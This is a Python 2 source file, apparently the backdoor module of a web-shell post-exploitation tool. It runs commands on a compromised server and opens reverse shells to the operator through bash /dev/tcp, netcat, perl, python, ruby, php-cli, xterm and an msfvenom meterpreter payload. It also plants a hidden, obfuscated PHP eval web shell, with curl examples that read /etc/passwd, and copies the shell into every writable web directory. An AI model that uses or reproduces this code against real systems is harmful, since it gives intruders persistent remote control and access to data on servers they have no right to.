import string

from subprocess import Popen, PIPE
from random import choice
from itertools import product
from base64 import b64encode

from modules.shell_handler import linux
from core.libs.menu import getargs
from core.libs.request_handler import make_request
from core.libs.thirdparty.termcolor import cprint, colored


# Source: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet (Thanks @pentestmonkey)
class Backdoor(object):
    '''
    The methods shown are tailored to Unix-like systems.
    Some of the examples below should also work on Windows
    if you use substitute "/bin/sh -i" with "cmd.exe".
    '''
    def list(self):
        print '\n[i] Usage: @backdoor [module] <*ip:port>'
        print '[i] Modules:'
        print '[i] \t*bash   \t\tUse bash to create a reverse shell (not all versions of bash support this!)'
        #print '[i] \t*java   \t\tUse java to create a reverse shell'
        print '[i] \t*msf    \t\tUse a linux metereter to create a reverse shell'
        #print '[i] \t*msf-php    \t\tUse a PHP metereter to create a reverse shell'
        print '[i] \t*netcat \t\tUse netcat traditional to create a reverse shell (not netcat OpenBSD)'
        print '[i] \t*perl   \t\tUse perl to create a reverse shell'
        print '[i] \tphp    \t\t\tAttempt to write a PHP file into the web root directory'
        #print '[i] \t*php-cli    \t\tUse php-cli to create a reverse shell'
        print '[i] \t*python \t\tUse python to create a reverse shell'
        print '[i] \t*ruby   \t\tUse ruby to create a reverse shell'
        print '[i] \tspread  \t\tSpread this shell around'
        #print '[i] \t*xterm  \t\tUse xterm to create a reverse shell'

    def bash(self, ip, port):
        cmd = "for x in `whereis bash`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        bash = make_request.get_page_source(cmd)
        if bash:
            cprint('\n[i] Found bash:')
            c = 1
            for path in bash:
                cprint('{0:2d}.) {1}'.format(c, path), 'green')
                c += 1
            msg = colored('\n[i] Make sure: \'{0}\' has a listener shell setup on port: \'{1}\'', 'green')
            msg += ' (hint: python webhandler.py -l {1} OR nc -lvvp {1})'
            msg += colored('\n[?] Press <return> when ready!', 'yellow')
            raw_input(msg.format(ip, port))
            for path in bash:
                cmd = 'nohup {0} -c \'{0} -i >& /dev/tcp/{1}/{2} 0>&1\' &'.format(path, ip, port)
                make_request.get_page_source(cmd)
                if self.checkPort(port):
                    break
            cprint('[+] Done!', 'blue')

    def msf(self, ip, port):
        if len(Popen("for x in `whereis msfvenom`; do file $x | grep symbolic; done", shell=True, stdout=PIPE).stdout.read().strip()) == 0:
            cprint('\n[!] Wasn\'t able to detect the metasploit framework', 'red')
        else:
            cprint('\n[i] Found the metasploit framework:', 'green')
            folder = linux.get_writble_dir()
            if folder:
                filename = ''.join(choice(string.ascii_letters + string.digits) for x in range(8))
                cprint('[+] Filename: \'{0}\''.format(filename), 'green')
                path = '{0}/{1}'.format(folder, filename)
                msg = colored('\n[i] Make sure: \'{0}\' has a listener shell setup on port: \'{1}\'', 'green')
                msg += ' (hint: msfcli exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} E)'
                msg += colored('\n[?] Press <return> when ready!', 'yellow')
                raw_input(msg.format(ip, port))
                cprint('[i] Generating linux/x86/meterpreter/reverse_tcp', 'green')
                shell = Popen('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf | base64'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
                cmd = 'echo "{0}" | base64 -i -d > {1} && chmod +x {1} && nohup {1} &'.format(shell, path)
                cprint('[+] Sending payload & executing', 'green')
                make_request.get_page_source(cmd)
                cprint('[+] Done!', 'blue')

    def netcat(self, ip, port):
        '''
        nc.OpenBSD deosn't have -e switch. Alternative solution:
            rm -f /tmp/f && mkfifo /tmp/f && cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT>/tmp/f
        '''
        cmd = "for x in `whereis nc netcat`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        netcat = make_request.get_page_source(cmd)
        if netcat:
            cprint('\n[i] Found netcat:', 'green')
            c = 1
            for path in netcat:
                cprint('{0:2d}.) {1}'.format(c, path), 'green')
                c += 1
            msg = colored('\n[i] Make sure: \'{0}\' has a listener shell setup on port: \'{1}\'', 'green')
            msg += ' (hint: python webhandler.py -l {1} OR nc -lvvp {1})'
            msg += colored('\n[?] Press <return> when ready!', 'yellow')
            raw_input(msg.format(ip, port))
            for path in netcat:
                cmd = 'nohup {0} {1} {2} -e /bin/bash &'.format(path, ip, port)
                make_request.get_page_source(cmd)
                if self.checkPort(port):
                    break
            cprint('[+] Done!', 'blue')
        else:
            cprint('\n[!] Didn\'t find netcat on the remote system', 'red')

    def perl(self, ip, port):
        cmd = "for x in `whereis perl`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        perl = make_request.get_page_source(cmd)
        if perl:
            cprint('\n[i] Found perl:', 'green')
            c = 1
            for path in perl:
                cprint('{0:2d}.) {1}'.format(c, path), 'green')
                c += 1
            msg = colored('\n[i] Make sure: \'{0}\' has a listener shell setup on port: \'{1}\'', 'green')
            msg += ' (hint: python webhandler.py -l {1} OR nc -lvvp {1})'
            msg += colored('\n[?] Press <return> when ready!', 'yellow')
            raw_input(msg.format(ip, port))
            for path in perl:
                cmd = 'nohup {0} -e '.format(path)
                cmd += '\'use Socket;'
                cmd += '$i="{0}";'.format(ip)
                cmd += '$p="{0}";'.format(port)
                cmd += 'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
                cmd += 'if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");'
                cmd += 'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' &'
                make_request.get_page_source(cmd)
                if self.checkPort(port):
                    break
            cprint('[+] Done!', 'blue')
        else:
            cprint('\n[!] Didn\'t find perl on the remote system', 'red')

    def php(self, ip, ourIP):
        wwwroot = linux.get_doc_root()
        cmd = 'find {0} -depth -perm -0002 -type d | sort -R '.format(wwwroot)
        folder = make_request.get_page_source(cmd)
        if folder:
            folder = folder[0]
            cprint('\n[+] Found a writable directory: \'{1}\''.format(folder), 'green')
            filename = '.' + ''.join(choice(string.ascii_letters + string.digits) for x in range(8)) + '.php'
            cprint('[+] Filename: \'{1}\''.format(filename), 'green')
            location = '{0}/{1}'.format(folder, filename)

            cmd = 'find {0} -type f -print'.format(wwwroot)
            files = make_request.get_page_source(cmd)
            cprint('[i] Select a file to \'clone\' (or \'0\' to skip):', 'green')
            cprint(' 0.) Don\'t close - create new', 'green')
            path = []
            c = 0
            for file in files:
                path.append(file)
                c += 1
                cprint('{0:2d}.) {1}'.format(c, file), 'green')
            while True:
                try:
                    clone = int(raw_input(colored('[>] Which file to use? [0-{0}: '.format(c))))
                    if 0 <= clone <= c:
                        break
                except ValueError:
                    pass

            if clone != 0:
                cmd = 'cp -f {0} {1}'.format(path[int(clone) - 1], location)
                make_request.get_page_source(cmd)
            cprint('[+] Creating our \'evil\' file: \'{0}\''.format(location), 'green')
            parameter = ''.join(choice(string.ascii_lowercase) for x in range(6))
            casePayload = choice(map(''.join, product(*((c.upper(), c.lower()) for c in 'eval'))))
            caseShell = choice(map(''.join, product(*((c.upper(), c.lower()) for c in 'php eval(base64_decode'))))
            payload = "{0}($_GET['{1}'].';');".format(casePayload, parameter)
            payloadEncoded = b64encode(payload).format(payload)
            evilFile = "<?{0}(\"{1}\")); ?>".format(caseShell, payloadEncoded)
            cmd = 'echo \'{0}\' >> \"{1}\"'.format(evilFile, location)
            make_request.get_page_source(cmd)
            cprint('[+] Done!', 'blue')
            uri = folder[len(wwwroot):]

            #>>> '/'.join('https://localhost/html/shell.php'.split('/', 3)[:3])
            #'https://localhost'
            url = '/'.join(getargs.url.split('/', 3)[:3])
            example = """Example:
            curl "{url}{uri}/{filename}?{parameter}=phpinfo()"
            curl "{url}{uri}/{filename}?{parameter}=require(\'/etc/passwd\')"
            curl "{url}{uri}/{filename}?{parameter}=system(\'/sbin/ifconfig\')"
            msfcli exploit/unix/webapp/php_eval RHOST={url} RPORT=80 PHPURI={uri}/{filename}?{parameter}=\!CODE\! PAYLOAD=php/meterpreter/reverse_tcp LHOST={ourIP} LPORT=4444 E""".format(
                    url=url,
                    uri=uri,
                    filename=filename,
                    parameter=parameter,
                    ourIP=ourIP,)
            cprint(example, 'green')
        else:
            cprint('\n[!] Unable to find a writable directory', 'red')

    def php_cli(self, ip, port):
        cmd = "for x in `whereis php`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        php = make_request.get_page_source(cmd)
        if php:
            cprint('\n[i] Found php-cli:', 'green')
            c = 1
            for path in php:
                cprint('{0:2d}.) {1}'.format(c, path), 'green')
                c += 1
            msg = colored('\n[i] Make sure: \'{0}\' has a listener shell setup on port: \'{1}\'', 'green')
            msg += ' (hint: python webhandler.py -l {1} OR nc -lvvp {1})'
            msg += colored('\n[?] Press <return> when ready!', 'yellow')
            raw_input(msg.format(ip, port))
            for path in php:
                cmd = 'nohup {0} -r '.format(path)
                cmd += '\'$sock=fsockopen("{0}",{1});'.format(ip, port)
                cmd += 'exec("/bin/sh -i <&3 >&3 2>&3");\' &'
                make_request.get_page_source(cmd)
                if self.checkPort(port):
                    break
            cprint('[+] Done!', 'blue')
        else:
            cprint('\n[!] Didn\'t find php-cli on the remote system', 'red')

    def python(self, ip, port):
        cmd = "for x in `whereis python`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        python = make_request.get_page_source(cmd)
        if python:
            cprint('\n[i] Found python:', 'green')
            c = 1
            for path in python:
                cprint('{0:2d}.) {1}'.format(c, path), 'green')
                c += 1
            msg = colored('\n[i] Make sure: \'{0}\' has a listener shell setup on port: \'{1}\'', 'green')
            msg += ' (hint: python webhandler.py -l {1} OR nc -lvvp {1})'
            msg += colored('\n[?] Press <return> when ready!', 'yellow')
            raw_input(msg.format(ip, port))
            for path in python:
                cmd = 'nohup {0} -c '.format(path)
                cmd += '\'import socket,subprocess,os;'
                cmd += 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
                cmd += 's.connect(("{0}",{1}));'.format(ip, port)
                cmd += 'os.dup2(s.fileno(),0);'
                cmd += 'os.dup2(s.fileno(),1);'
                cmd += 'os.dup2(s.fileno(),2);'
                cmd += 'p=subprocess.call(["/bin/sh","-i"]);\' &'
                make_request.get_page_source(cmd)
                if self.checkPort(port):
                    break
            cprint('[+] Done!', 'blue')
        else:
            cprint('\n[!] Didn\'t find python on the remote system', 'red')

    def ruby(self, ip, port):
        cmd = "for x in `whereis ruby`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        ruby = make_request.get_page_source(cmd)
        if ruby:
            cprint('\n[i] Found ruby:', 'green')
            c = 1
            for path in ruby:
                cprint('{0:2d}.) {1}'.format(c, path), 'green')
                c += 1
            msg = colored('\n[i] Make sure: \'{0}\' has a listener shell setup on port: \'{1}\'', 'green')
            msg += ' (hint: python webhandler.py -l {1} OR nc -lvvp {1})'
            msg += colored('\n[?] Press <return> when ready!', 'yellow')
            raw_input(msg.format(ip, port))
            for path in ruby:
                cmd = 'nohup {0} -rsocket -e'.format(path)
                cmd += '\'f=TCPSocket.open("{0}",{1}).to_i;'.format(ip, port)
                cmd += 'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\' &'
                make_request.get_page_source(cmd)
                if self.checkPort(port):
                    break
            cprint('[+] Done!', 'blue')
        else:
            cprint('\n[!] Didn\'t find ruby on the remote system', 'red')

    def checkPort(self, port):
        return make_request.get_page_source('netstat -nltp | grep {0}'.format(port))

    # A method to spread the shell in all writable directories
    def spread(self):
        provided_shell_name = raw_input(colored('\n[?] Current shell name: ', 'green'))
        shell_name = getargs.url.split('/')[-1] if getargs.method == 'post' else provided_shell_name
        cmd = 'find {0} -depth -perm -0002 -type d | xargs -n 1 cp -v {1}'.format(linux.get_doc_root(), shell_name)
        done = make_request.get_page_source(cmd)
        if done:
            success = '\n[+] {shell_name}{end} already written to {hot}{writable_length} paths'.format(
                    shell_name=shell_name,
                    writable_length=len(done))
            success += '\n[+] To check these paths type @enum writable'
            cprint(success, 'blue')
        else:
            cprint('\n[!] Something went wrong while spreading shell', 'red')

    def xterm(self, ip, port):
        cmd = "for x in `whereis xterm`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        xterm = make_request.get_page_source(cmd)
        if xterm:
            cprint('\n[i] Found xterm:', 'green')
            c = 1
            for path in xterm:
                cprint('{0:2d}.) {1}'.format(c, path), 'green')
                c += 1
            #raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
            for path in xterm:
                cmd = 'nohup {0} xterm -display {1}:1 &'.format(path, ip)
                make_request.get_page_source(cmd)
                if self.checkPort(port):
                    break
            cprint('[+] Done!', 'blue')
        else:
            cprint('\n[!] Didn\'t find xterm on the remote system', 'red')

backdoor = Backdoor()
